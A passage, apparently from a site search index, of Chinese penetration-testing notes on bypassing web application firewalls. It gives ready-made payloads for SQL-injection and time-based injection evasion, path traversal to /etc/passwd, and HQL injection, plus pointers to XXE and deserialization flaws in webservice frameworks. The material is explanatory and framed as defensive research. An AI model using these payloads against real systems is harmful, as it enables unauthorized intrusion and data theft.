\u201dfilename='abc.php\u2019\u201d\u3002\u800cWAF\u53ea\u6309\u7167\u534f\u8bae\u6807\u51c6\u53bb\u89e3\u6790\uff0c\u65e0\u6cd5\u89e3\u6790\u6587\u4ef6\u540d\uff0c\u4f46\u662f\u540e\u7aef\u5bb9\u5668\u80fd\u6b63\u786e\u83b7\u5f97\u6587\u4ef6\u540d\uff0c\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u573a\u666f\u7684\u7ed5\u8fc7\u5f62\u5f0f\uff1a Content-Disposition: form-data; name=\"file\"; filename=abc.php Content-Disposition: form-data; name=\"file\"; filename=\"abc.php Content-Disposition: form-data; name=\"file\"; filename='abc.php\u2019 3.4\u53c2\u6570\u6c61\u67d3 \u8bf7\u6c42\u4e2d\u5305\u542b2\u4e2a\u53c2\u6570\u540d\u76f8\u540c\u7684\u53c2\u6570typeid\uff0c\u7b2c\u4e00\u4e2a\u662f\u6b63\u5e38\u53c2\u6570\u7684\u503c\u6b63\u5e38\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u624d\u662fpayload\u3002\u5982\u679cWAF\u89e3\u6790\u53c2\u6570\u4f7f\u7528\u7b2c\u4e00\u4e2a\u503c\uff0c\u6ca1\u68c0\u67e5\u7b2c\u4e8c\u4e2a\u503c\uff0c\u5c06\u5bfc\u81f4\u7ed5\u8fc7\u3002\u8fd9\u662f\u5f88\u4e45\u5f88\u4e45\u7684\u4e00\u4e2aCASE\uff0c\u73b0\u5728\u51e0\u4e4e\u6ca1\u6709WAF\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898\u3002 /forum.php\uff1f typeid=644&typeid=if(now()%3dsysdate()%2csleep(19.844)%2c0)/ 'XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR%22 /","title":"3.3\u534f\u8bae\u89e3\u6790\u4e0e\u540eWEB\u5bb9\u5668\u7684\u534f\u8bae\u89e3\u6790\u4e0d\u4e00\u81f4"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#4","text":"\u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u7ed5\u8fc7WAF\u89c4\u5219\u4e3b\u8981\u601d\u8003\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\u5728\u60f3\u4ec0\u4e48\uff0c\u5bb9\u6613\u5ffd\u7565\u4ec0\u4e48\uff0c\u63a8\u65ad\u4e00\u4e9b\u53ef\u80fd\u7ed5\u8fc7\u7684\u65b9\u5f0f\uff0c\u7136\u540e\u591a\u6b21\u5c1d\u8bd5\u8fdb\u884c\u9a8c\u8bc1\u3002\u96b6\u5c5e\u4e8e\u6f0f\u6d1e\u5c42\u9762\u8fc7waf","title":"4. \u89c4\u5219\u5c42\u9762\u7684\u7ed5\u8fc7"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#41-sql","text":"\u7ed5\u8fc7SQL\u6ce8\u5165\u89c4\u5219\u4e3b\u8981\u5229\u7528WAF\u89c4\u5219\u672c\u8eab\u7684\u95ee\u9898\u3001\u672a\u8003\u8651\u5230SQL\u8bed\u6cd5\u53d8\u5f62\u3001\u53ca\u540e\u7aef\u6570\u636e\u5e93SQL\u8bed\u53e5\u8bed\u6cd5\u7279\u6027 \u6ce8\u91ca\u7b26\u7ed5\u8fc7 / xxx /\u662f\u6ce8\u91ca\uff0c\u4e5f\u53ef\u4ee5\u5145\u5f53\u7a7a\u767d\u7b26\u3002\u56e0\u4e3a / /\u53ef\u4f7f\u5f97MySQL\u5bf9sql\u8bed\u53e5(union/ /select)\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u3002\u4e8b\u5b9e\u4e0a\u8bb8\u591aWAF\u90fd\u8003\u8651\u5230/**/\u53ef\u4ee5\u4f5c\u4e3a\u7a7a\u767d\u5206\uff0c\u4f46\u662fwaf\u68c0\u6d4b \u201c/*. */\u201d\u5f88\u6d88\u8017\u6027\u80fd\uff0c\u5de5\u7a0b\u5e08\u4f1a\u6298\u4e2d\uff0c\u53ef\u80fd\u5728\u68c0\u6d4b\u4e2d\u95f4\u5f15\u5165\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\uff0c\u4f8b\u5982\uff1a/ \\w+*/\u3002\u6216\u8005\uff0cWAF\u53ef\u80fd\u53ea\u4e2d\u95f4\u68c0\u67e5n\u4e2a\u5b57\u7b26\u201c/*.{,n}*/\u201d\u3002\u6839\u636e\u4ee5\u4e0a\u60f3\u6cd5\uff0c\u53ef\u4ee5\u9010\u6b65\u6d4b\u8bd5\u7ed5\u8fc7\u65b9\u6cd5\uff1a \u5148\u6d4b\u8bd5\u6700\u57fa\u672c\u7684\uff1aunion/**/select \u518d\u6d4b\u8bd5\u4e2d\u95f4\u5f15\u5165\u7279\u6b8a\u5b57\uff1aunion/ aaaa%01bbs /select \u6700\u540e\u6d4b\u8bd5\u6ce8\u91ca\u957f\u5ea6\uff1aunion/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /select \u540c\u7406\uff0c\u5bf9\u4e8e/ !xxx /\uff0c\u53ef\u4ee5\u91c7\u53d6\u7c7b\u4f3c\u7684\u601d\u8def\u7ed5\u8fc7WAF\u3002 \u7a7a\u767d\u7b26\u7ed5\u8fc7 \u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c SQL\u6ce8\u5165\u89c4\u5219\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u201c\\s\u201d\u5339\u914d\u7a7a\u683c\uff0c\u4f8b\u5982\u201dselect\\s+union\u201d\u3002\u5229\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u7a7a\u767d\u7b26\u4e0eMySQL\u7a7a\u767d\u7b26\u7684\u4e0d\u540c\u53ef\u7ed5\u8fc7WAF\u89c4\u5219\u3002\u5982\u4f55\u8fd9\u4e9bMySQL\u7684\u7279\u6027\uff1f\u901a\u8fc7fuzz,\u6bcf\u6b21\u66f4\u6539\u6b63\u5e38SQL\u8bed\u53e5\u7684\u67d0\u90e8\u5206\uff0c\u66ff\u6362\u4e3a\u5176\u4ed6\u5b57\u7b26\uff0c\u5224\u65ad\u8bed\u6cd5\u662f\u5426\u6b63\u786e\uff0c\u5373\u53ef\u5224\u65ad\u51fa\u6765MySQL\u8bed\u6cd5\u7279\u6027\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5206\u6790MySQL\u8bcd\u6cd5\u6765\u53d1\u73b0\u8bed\u6cd5\u7279\u6027\uff0c\u4ece\u800c\u627e\u5230\u7ed5\u8fc7\u65b9\u6cd5\u3002 \u5229\u7528\u7a7a\u767d\u7b26\u8fdb\u884c\u7ed5\u8fc7\uff0c\u6d4b\u8bd5WAF\u65f6\u5c3d\u53ef\u80fd\u51cf\u5c11\u5176\u4ed6\u539f\u56e0\u7684\u5f71\u54cd\uff0c\u4f8b\u5982\u201dunion select\u201d\u88ab\u62e6\u622a\uff0c\u53ea\u9700\u628a\u4e2d\u95f4\u7a7a\u767d\u7b26\u66ff\u6362\u4e3a\u201d%250C\u201d, \u201c%25A0\u201d\u8fdb\u884c\u7ed5\u8fc7\u6d4b\u8bd5\u3002 union%250Cselect union%25A0select \u51fd\u6570\u5206\u9694\u7b26 \u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u6211\u4eec\u731c\u6d4b\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\uff0c\u53ef\u80fd\u4e0d\u77e5\u9053\u51fd\u6570\u540d\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\uff0c\u6216\u8005\u9057\u6f0f\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\u3002\u4f8b\u5982\u5339\u914d\u51fd\u6570\u201dconcat()\u201d\u7684\u89c4\u5219\u5199\u6cd5\uff0c\u201cconcat(\u201d\u6216\u8005\u201dconcat\\s*(\u201d\uff0c\u5c31\u6ca1\u6709\u8003\u8651\u5230\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u3002\u76f8\u5e94\u7684\u7ed5\u8fc7\u65b9\u6cd5\uff0c\u5728\u7279\u6b8a\u4f4d\u7f6e\u5f15\u5165\u7279\u6b8a\u7684\u5206\u9694\u7b26\uff0c\u9010\u4e2a\u6d4b\u8bd5\u3002\u8fd9\u4e9b\u7279\u6b8a\u5206\u9694\u7b26\u53d1\u73b0\u4e5f\u662f\u901a\u8fc7Fuzz\u51fa\u6765\u7684\u3002 concat%2520( concat/**/( concat%250c( concat%25a0( \u4e3e\u4e00\u53cd\u4e09\uff0c\u5bfb\u627e\u7c7b\u4f3c\u7684\u5173\u952e\u4f4d\u7f6e\uff0cFuzz\u7279\u6b8a\u5b57\u7b26\uff0c\u53d1\u73b0\u66f4\u591a\u7684\u7ed5\u8fc7\u65b0\u65b9\u6cd5\u3002\u731c\u6d4b\u5de5\u7a0b\u5e08\u4eec\u5199\u89c4\u5219\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u5bb9\u6613\u9057\u6f0f\u7684\u70b9\uff0c\u8fdb\u884c\u7ed5\u8fc7WAF\u68c0\u6d4b\u3002 \u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790 \u5229\u7528MySQL\u89e3\u6790\u6d6e\u70b9\u6570\u7684\u7279\u70b9\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u65e0\u6cd5\u5339\u914d\u51fa\u5355\u8bcdunion\uff0c\u4f46\u662fMySQL\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u89e3\u6790\u51fa\u6d6e\u70b9\u6570\u3001sql\u5173\u952e\u5b57union\u3002 select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=\\Nunion select 1,2,3,4,5,6,7,8,9,0 \u5229\u7528error-based\u8fdb\u884cSQL\u6ce8\u5165 Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u975e\u5e38\u5bb9\u6613\u88ab\u5ffd\u7565\uff0c\u5bfc\u81f4WAF\u89c4\u5219\u8fc7\u6ee4\u4e0d\u5b8c\u6574\u3002\u968f\u7740\u5bf9MySQL\u7814\u7a76\u8d8a\u6765\u8d8a\u6df1\uff0c\u88ab\u53d1\u73b0\u53ef\u7528\u4e8eerror-based SQL\u6ce8\u5165\u7684\u51fd\u6570\u8d8a\u6765\u8d8a\u591a\uff0c\u540c\u65f6\u4e5f\u7ed9\u7ed5\u8fc7WAF\u9020\u5c31\u4e86\u66f4\u591a\u673a\u4f1a\u3002\u5e38\u89c1\u7684\u51fd\u6570\uff1a extractvalue(1, concat(0x5c,md5(3))); updatexml(1, concat(0x5d,md5(3)),1); GeometryCollection((select*from(select*from(select@@version)f)x)) polygon((select*from(select name_const(version(),1))x)) linestring() multipoint() multilinestring() multipolygon() \u5229\u7528Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u8fdb\u884c\u7ed5\u8fc7\u65f6\uff0c\u53ef\u4ee5\u7ed3\u5408\u51fd\u6570\u5206\u9694\u7b26\uff0c\u6216\u5176\u4ed6\u65b9\u6cd5\u7075\u6d3b\u8fd0\u7528\u3002 Mysql\u7279\u6b8a\u8bed\u6cd5 \u6700\u6709\u6548\u7684\u53d1\u73b0\u624b\u6bb5\uff0c\u8fd8\u662f\u53bb\u8bfb\u8bfbMySQL\u8bcd\u6cd5\u5206\u6790\u6e90\u4ee3\u7801\u3002\u548c\u534f\u8bae\u7ed5\u8fc7\u7c7b\u4f3c\uff0c\u6316\u6398SQL\u6807\u51c6\u4e0eMySQL\u7684\u8bcd\u6cd5\u5206\u6790\u5dee\u5f02\u662f\u53d1\u73b0WAF SQL\u6ce8\u5165\u7ed5\u8fc7\u7684\u6709\u6548\u624b\u6bb5\u3002\u4ee5\u4e0b\u662fMySQL\u8bed\u6cd5\u7684\u4e00\u4e2a\u7279\u5199(ps:\u4e0d\u662f\u6211\u53d1\u73b0\u7684)\uff1a select{x table_name}from{x information_schema.tables}; \u7efc\u5408\u5229\u7528\u5b9e\u4f8b \u4ee5\u4e0a\u90fd\u662fSQL\u6ce8\u5165\u7ed5\u8fc7\u4e2d\u7684\u6280\u672f\u70b9\uff0c\u5728\u5b9e\u9645\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u9700\u8981\u7075\u6d3b\u7efc\u5408\u5229\u7528\u624d\u80fd\u8fbe\u5230\u5b8c\u6574\u7ed5\u8fc7\uff0c\u8bfb\u53d6\u6570\u636e\u6570\u636e\u3002\u4ee5\u4e0b\u7ed9\u51fa\u5b8c\u6574\u7ed5\u8fc7WAF SQ\u6ce8\u5165\u68c0\u6d4b\u7684\u5b9e\u4f8b\u3002\u5982\u56fe\uff0c\u672c\u4f8b\u4e2d\u7efc\u5408\u591a\u4e2a\u7ed5\u8fc7\u6280\u672f\u70b9\uff0c\u6700\u7ec8\u5b9e\u73b0\u5b8c\u6574\u7ed5\u8fc7\u5b9e\u73b0\u8bfb\u53d6\u6570\u636e\u3002 \u5229\u7528\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7union select \u7684\u68c0\u6d4b\u3002 \u540c\u6837\uff0c\u51fd\u6570\u5206\u9694\u7b26\u601d\u60f3\u96c6\u548c\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7\u5173\u952e\u5b57from\u7684\u68c0\u6d4b\u3002 \u6700\u540e\u7a7a\u767d\u5206\u5206\u5272\u7ed5\u8fc7INFORMATION_SCHEMA.TABLES\u7684\u68c0\u67e5","title":"4.1. SQL\u6ce8\u5165\u7ed5\u8fc7"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#42","text":"\u6587\u4ef6\u5305\u542b\u5206\u4e3a\u76f8\u5bf9\u8def\u5f84\u3001\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u3002\u5728\u76f8\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u4e2d\uff0c\u6700\u7ec8\u6839\u636eLinux\u865a\u62df\u6587\u4ef6\u7cfb\u7edf(vfs)\u7684\u89c4\u5219\u67e5\u627e\u6587\u4ef6\uff0c\u901a\u8fc7\u5206\u6790vfs\u7684\u6587\u4ef6\u8def\u5f84\u89e3\u6790\u89c4\u5219\uff0c\u63d0\u53d6\u5176\u4e2d\u89c4\u5219\u7279\u70b9\uff0c\u7528\u8fd9\u4e9b\u7279\u70b9\u53bb\u7ed5\u8fc7WAF\u3002\u5728\u7edd\u5bf9\u6587\u4ef6\u8def\u5f84\u5305\u542b\u4e2d\uff0c\u4e3b\u8981\u662f\u6839\u636e\u653b\u51fb\u573a\u666f\uff0cWAF\u672a\u8fc7\u6ee4\u4e00\u4e9b\u534f\u8bae\u3001\u672a\u8fc7\u6ee4\u67d0\u4e9b\u7279\u6b8a\u8def\u5f84\u3002 \u76f8\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 \u5199WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u65f6\uff0c\u5982\u679c\u68c0\u6d4b\u5355\u4e00\u7684\u201d../\u201d\uff0c\u8bef\u62a5\u4f1a\u975e\u5e38\u591a\uff0c\u6240\u4ee5WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u901a\u5e38\u4f1a\u68c0\u6d4b\u8fde\u7eed\u7684\u201c../\"\u3002\u6839\u636evfs\u89e3\u6790\u8def\u5f84\u7684\u8bed\u6cd5\uff0c\u89e3\u6790\u5230\u201c//\u201d\u6587\u4ef6\u8def\u5f84\u4e0d\u53d8\uff0c\u89e3\u6790\u5230\u201c/./\u201d\u6587\u4ef6\u8def\u5f84\u4f9d\u7136\u3002 \u901a\u8fc7\u907f\u514d\u8fde\u7eed\u7684\"../\"\uff0c\u4ece\u800c\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u3002Eg: ././..///./.././/../etc//passwd\uff0c\u5b83\u7b49\u4ef7\u4e8e../../../etc/passwd \u7edd\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 WAF\u6ca1\u6709\u8003\u8651\u5230\u8def\u5f84\u4e2d\u63d2\u5165\u201c/./\u201d\u3001\u201c//\u201d\u5bf9\u4e8evfs\u89e3\u6790\u8def\u5f84\u662f\u7b49\u4ef7\u7684\uff0c\u5bfc\u81f4\u53ef\u88ab\u7ed5\u8fc7\u3002\u4f8b\u5982 /etc/./passwd \u4e0e /etc/passwd \u662f\u7b49\u4ef7\u7684\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7\u7ec4\u5408\u201c/./\u201d\u3001\u201c//\u201d\u8fdb\u884c\u7ed5\u8fc7\uff0ceg. /etc///.//././/passwd\u3002 \u5bf9\u4e8e\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\uff0cWAF\u4e00\u822c\u4f1a\u62e6\u622a\u5e38\u89c1\u8def\u5f84\uff0c\u800c\u4e0d\u4f1a\u9632\u5fa1\u6240\u6709\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u56e0\u6b64\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u53ef\u4ee5\u5305\u542b\u5176\u4ed6\u7684\u8def\u5f84\u4e0b\u4e00\u4e9b\u6587\u4ef6\uff0c\u4f8b\u5982/usr/local/nginx/conf/nginx.conf\u3002 \u5982\u679cWAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u68c0\u67e5\u5f00\u59cb\u8def\u5f84\u4e3aLinux\u7684\u76ee\u5f55\u540d\uff0c\u53ef\u4ee5\u91c7\u7528/wtt/../\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u68c0\u6d4b\u3002 \u4f8b\u5982\uff0c\u201c/wtt/../etc/passwd\u201d\uff0c wtt\u4e0d\u662fLinux\u6807\u51c6\u76ee\u5f55\uff0c\u4e0d\u4f1a\u88ab\u89c4\u5219\u5339\u914d\u3002WAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u4f46\u662f\u53ea\u4f7f\u7528\u4e00\u4e2a../\uff0c\u4e0d\u88ab\u62e6\u622a\u3002\u6700\u7ec8\u8bfb\u53d6/etc/passwd\u6587\u4ef6\u3002 \u5229\u7528WAF\u672a\u68c0\u6d4b\u7684\u534f\u8bae\u3002PHP \u6587\u4ef6\u5305\u542b\u652f\u6301\u7684\u534f\u8bae\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u770b\u73af\u5883\u9009\u62e9\u53ef\u884c\u7684\u65b9\u6cd5 file:// \u2014 Accessing local filesystem http:// \u2014 Accessing HTTP(s) URLs ftp:// \u2014 Accessing FTP(s) URLs php:// \u2014 Accessing various I/O streams zlib:// \u2014 Compression Streams data:// \u2014 Data (RFC 2397) glob:// \u2014 Find pathnames matching pattern phar:// \u2014 PHP Archive ssh2:// \u2014 Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 Audio streams expect:// \u2014 Process Interaction Streams \u603b\u7ed3 \u4e00\u4e2a\u597dWAF\u4e0d\u662f\u5439\u51fa\u6765\u7684\uff0c\u662f\u5b9e\u8df5\u68c0\u9a8c\u51fa\u6765\u7684\u3002\u7814\u7a76WAF\u7684\u7ed5\u8fc7\u624b\u6bb5\uff0c\u662f\u4e3a\u4e86\u66f4\u597d\u7684\u63d0\u5347WAF\u7684\u9632\u5fa1\u80fd\u529b\u3002\u5728\u7814\u7a76\u7a81\u7834\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u8981\u4ec5\u4ec5\u505c\u7559\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u57fa\u672c\u6f0f\u6d1e\u539f\u7406\uff0c\u9700\u8981\u5bf9\u6d89\u53ca\u5e76\u6df1\u5165\u66f4\u591a\u7684\u9886\u57df\uff0c\u4f8b\u5982HTTP\u534f\u8bae\u7406\u89e3\u548cPHP\u3001Tomcat\u5bf9HTTP\u534f\u8bae\u6e90\u7801\u5206\u6790\uff0cMySQL\u8bcd\u6cd5\u5206\u6790\uff0c\u548cFuzz\u7684\u601d\u8def\u7b49\u3002\u5728\u6b64\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u6709\u8bb8\u591a\u4e50\u8da3\uff0c\u4e5f\u4f1a\u6709\u5404\u65b9\u9762\u80fd\u529b\u7684\u63d0\u5347\u3002","title":"4.2.\u6587\u4ef6\u5305\u542b"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#3","text":"","title":"3.\u6846\u67b6\u5c42\u7684\u8bed\u53e5\u5206\u6790"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#jpql","text":"jpql\u4e0eSQL\u7684\u533a\u522b\u5c31\u662fSQL\u662f\u9762\u5411\u5bf9\u8c61\u5173\u7cfb\u6570\u636e\u5e93\uff0c\u4ed6\u64cd\u4f5c\u7684\u662f\u6570\u636e\u8868\u548c\u6570\u636e\u5217\uff0c\u800cjpql\u64cd\u4f5c\u7684\u5bf9\u8c61\u662f\u5b9e\u4f53\u5bf9\u8c61\u548c\u5b9e\u4f53\u5c5e\u6027 ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 JPQL \uff09\uff1a SELECT e FROM user e WHERE e.id = SQL('(select 1 from dual where 1=1)\u2019) and SQL('(SELECT 1)=1\u2019) \u5b57\u7b26\u7c7b\u578b\uff08JPQL\uff09\uff1a \u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165","title":"\u57fa\u4e8ejpql\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#hibernate","text":"ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 Hibernate ORM \uff09\uff1a test\\'' or 1<length((select version())) \u2013 \u7ffb\u8bd1\u6210\u4e3aHQL\u8bed\u53e5\u5c31\u53d8\u4e3a\uff1a SELECT p FROM pl.btbw.persistent.Post p where p.name='test\\'' or 1<length((select version())) \u2013 ' \u6700\u540e\u8f6c\u53d8\u4e3a\u771f\u6b63\u7684SQL\u8bed\u53e5\uff1a select post0_.id as id1_0_, post0_.name as name2_0_ from post post0_ where post0_.name=\u2018test\\'' or 1<length((select version())) -- ' \u8fd9\u6837\u6211\u4eec\u5c31\u4f1a\u9003\u9038\u51fa\u6765\u4e00\u4e2a\u8bed\u53e5\u6216\u8005\u65b9\u6cd5 \u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165","title":"\u57fa\u4e8eHibernate\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#_4","text":"","title":"\u4e8c\u3001\u57fa\u4e8e\u4e09\u65b9\u8c03\u7528\u6846\u67b6\u5206\u6790\u5229\u7528"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#webservice","text":"1.\u9ed8\u8ba4\u7684\u5b89\u5168\u914d\u7f6e2.\u672a\u6388\u6743\u7684\u8bbf\u95ee3.\u81ea\u8eab\u672a\u4fee\u590d\u6f0f\u6d1eWEBSERVICE Jws\u6587\u4ef6\u5ba1\u8ba1 \u200b \u901a\u5e38\u800c\u8a00jws\u6587\u4ef6\u4e5f\u662faxis2\u53d1\u5e03\u7684\u4e00\u79cd\u8868\u73b0\u5f62\u5f0f\uff0c\u7136\u540e\u66f4\u591a\u7684\u88ab \u5ba1\u8ba1\u4eba\u5458\u5ffd\u7565 \u5728web\u76ee\u5f55\u5168\u5c40\u67e5\u627ejws\u7ed3\u5c3e\u7684\u6587\u4ef6 \u6839\u636e\u5bf9\u5e94\u7684web\u8bbf\u95ee\u76ee\u5f55\u901a\u8fc7\u6d4f\u89c8\u5668\u8fdb\u884c\u8bbf\u95ee \u5bf9\u5176\u76f8\u5e94\u7684\u63a5\u53e3\u8fdb\u884c\u5ba1\u8ba1 SOAPMonitor \u7528\u6765\u8fdb\u884cwebservice\u7ba1\u7406\u53d1\u5e03\uff0c\u8c03\u8bd5\u7b49\u7b49\uff0c\u8fd9\u91cc\u9762\u5b58\u5728\u4e00\u4e2a\u53cd\u5e8f \u5217\u5316\u7684\u95ee\u9898 \u8bbf\u95ee\u6839\u8def\u5f84/SOAPMonitor , \u53f3\u952e\u6e90\u7801\u5c31\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u914d\u7f6e\u9879 \u5185\u5bb9 \u8fdc\u7a0b\u8c03\u8bd5\u65f6\u5019\u5f00\u653e\u9ed8\u8ba45001\u7aef\u53e3\u8fdb\u884c\u5bf9\u8c61\u4f20\u8f93 \u5bfb\u627e\u5bf9\u5e94\u7684\u6267\u884c\u94fe\u6784\u9020payload\u8fdb\u884crec Axis2 \u5bf9\u4e8e\u6574\u4e2a\u9879\u76ee\u901a\u8fc7axis2\u6216\u8005axis\u53d1\u5e03\u7684\u670d\u52a1\uff0c\u4ece\u7edf\u8ba1\u7ecf\u9a8c\u4e0a\u6765\u8bb2\uff0c \u672a\u6388\u6743\u5927\u9762\u79ef\u5b58\u5728\uff0c\u800c\u4e14\u4f4e\u7248\u672c\u7684\u4ece\u5168\u5c40\u4e0a\u5c31\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u6f0f\u6d1e \u8bbf\u95ee\u5bf9\u5e94\u7684webservice\u8def\u5f84\uff0c\u6bd4\u5982/services/\u6216\u8005 /servlet/AxisServlet \u5bf9\u6240\u6709\u63a5\u53e3\u5bf9\u5e94\u7684\u7c7b\u8fdb\u884c\u5ba1\u8ba1\uff0c\u901a\u5e38\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u90fd\u662f\u4e00\u4e00\u5bf9\u5e94 \u4f4e\u7248\u672c\u6784\u9020xxe payload\u53ef\u4ee5\u8fdb\u884c\u6f0f\u6d1e\u6d4b\u8bd5 Xfire Web\u53d1\u5e03\u5bb9\u5668\uff0c\u5df2\u7ecf\u505c\u6b62\u7ef4\u62a4\uff0c\u622a\u81f3\u5230\u6700\u540e\u4e00\u4e2a\u7248\u672c\uff0c\u5728 webservice\u4e0a\u8fd8\u662f\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u8bbf\u95ee\u6839\u8def\u5f84/services\uff0c\u66b4\u9732\u5bf9\u5e94\u7684webservices\u63a5\u53e3 \u6784\u9020payload\u5168\u5c40\u9020\u6210xml\u5b9e\u4f53\u6ce8\u5165","title":"WEBSERVICE\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#dwr","text":"\u5b9e\u9645\u7684\u7f51\u7ad9\u53d1\u5e03debug\u6a21\u5f0f\u662f\u5173\u95ed\u72b6\u6001\uff0c\u6211\u4eec\u505a\u9ed1\u76d2\u6d4b\u8bd5\u5c31\u8981\u53bb\u731c\u6d4b \u4e24\u4e2a\u9ed8\u8ba4\u76ee\u5f55,\u5206\u522b\u4e3a/exec/\u548c/dwr \u5ba1\u8ba1\u53ef\u4ee5\u5957\u7528\u5de6\u8fb9\u7684\u8bf7\u6c42\u5305\u7684\u6a21\u677f\uff0c\u5728\u4f60\u8ba4\u4e3a\u5b58\u5728\u95ee\u9898\u7684\u5730\u65b9\u6784\u9020 java\u63a5\u53e3\u8c03\u7528\u7684\u8bf7\u6c42\u6570\u636e\u5305 \u7f51\u7ad9\u53d1\u5e03dwr\u63a5\u53e3\uff0c\u901a\u5e38\u90fd\u662f\u672a\u6388\u6743\u8c03\u7528\uff0c\u5305\u542b\u5185\u5bb9\u6bd4\u8f83\u591a\uff0c\u6bd4\u5982\u7528 \u6237\uff0c\u7ba1\u7406\u7b49api\u63a5\u53e3 \u5982\u679c\u53c2\u6570\u6784\u9020\u6709\u4e0d\u786e\u5b9a\u56e0\u7d20\uff0c\u53ef\u4ee5\u628a\u5bf9\u5e94\u7684dwr\u63a5\u53e3\u7a7a\u5b9e\u73b0\uff0c\u7136\u540e\u8f6c 